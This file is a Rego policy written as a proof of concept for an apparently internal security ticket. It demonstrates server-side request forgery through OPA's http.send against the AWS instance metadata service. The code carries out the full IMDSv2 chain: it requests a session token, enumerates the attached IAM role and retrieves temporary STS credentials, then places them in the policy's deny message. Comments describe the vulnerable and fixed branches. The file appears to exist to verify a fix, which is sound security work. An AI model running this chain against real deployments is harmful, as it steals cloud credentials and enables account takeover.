package nuon

# PRO-3595 PoC — SSRF to AWS IMDSv2 via OPA http.send (legacy `package nuon` path)
#
# Policies are authored in an app config and evaluated on the CONTROL PLANE
# worker, not in the customer's cloud. Before the fix on
# fd/pro-3597/opa/restrict-httpsend, OPA's `http.send` builtin is enabled, so a
# policy can drive the full IMDSv2 token dance and read the response body back.
#
# This rule performs the attack and inlines whatever it recovered into the deny
# message, so the leaked data is visible locally in the policy result. It does
# NOT send anything to an external host — readback stays on the control plane.
#
# Expected behavior:
#   main (vulnerable): compiles + evaluates; deny message contains the IMDS
#                      role name and temporary STS credentials.
#   fix branch:        config validation / compile FAILS with
#                      "undefined function http.send" (http.send removed from
#                      capabilities), so the policy can never run.

imds := "http://169.254.169.254"

# Step 1: IMDSv2 requires a session token obtained via PUT.
token := resp.raw_body if {
	resp := http.send({
		"method": "PUT",
		"url": sprintf("%s/latest/api/token", [imds]),
		"headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
		"raise_error": false,
	})
}

# Step 2: enumerate the instance's attached IAM role name.
role := trim_space(resp.raw_body) if {
	resp := http.send({
		"method": "GET",
		"url": sprintf("%s/latest/meta-data/iam/security-credentials/", [imds]),
		"headers": {"X-aws-ec2-metadata-token": token},
		"raise_error": false,
	})
}

# Step 3: pull the temporary STS credentials for that role.
creds := resp.raw_body if {
	resp := http.send({
		"method": "GET",
		"url": sprintf("%s/latest/meta-data/iam/security-credentials/%s", [imds, role]),
		"headers": {"X-aws-ec2-metadata-token": token},
		"raise_error": false,
	})
}

# The deny fires unconditionally and carries the stolen data back in its message.
deny contains msg if {
	msg := sprintf(
		"PRO-3595 SSRF reached IMDSv2 from the control plane. role=%q credentials=%s",
		[role, creds],
	)
}

# Even when the role/creds lookups come back empty, prove the token PUT worked:
# a non-empty token is itself proof the control plane can reach 169.254.169.254.
deny contains msg if {
	count(token) > 0
	msg := sprintf("PRO-3595 SSRF: obtained IMDSv2 session token (len=%d) from control plane", [count(token)])
}
